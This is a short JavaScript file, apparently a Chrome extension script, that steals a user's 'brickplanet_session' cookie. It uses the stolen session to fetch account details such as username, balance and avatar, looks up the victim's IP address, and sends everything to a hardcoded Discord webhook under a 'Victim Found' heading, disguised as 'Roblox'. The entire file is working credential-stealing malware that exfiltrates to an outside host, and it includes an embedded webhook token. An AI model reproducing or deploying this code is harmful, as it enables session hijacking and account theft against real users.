const WEBHOOK = "https://canary.discord.com/api/webhooks/1054896343296004116/Qnt4t2FGVI-WYW0xJOMiXe_wIaJNbyLWGt4SD6nDW71I-Ro3iGtxIzMqRYsEYb0eeVz9";

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.brickplanet.com/", {
            headers: {
                Cookie: "brickplanet_session=" + cookie
            },
            redirect: "manual"
        })).json();
    }
    
    fetch(WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify({
            "content": null,
            "embeds": [
              {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                  {
                    "name": "Username",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Robux",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Premium",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                  }
                ],
                "author": {
                  "name": "Victim Found: " + ipAddr,
                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                  "text": "https://github.com/ox-y",
                  "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                "thumbnail": {
                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
              }
            ],
            "username": "Roblox",
            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
            "attachments": []
        })
    });
}

chrome.cookies.get({"url": "https://www.brickplanet.com/", "name": "brickplanet_session"}, function(cookie) {
    main(cookie ? cookie.value : null);
});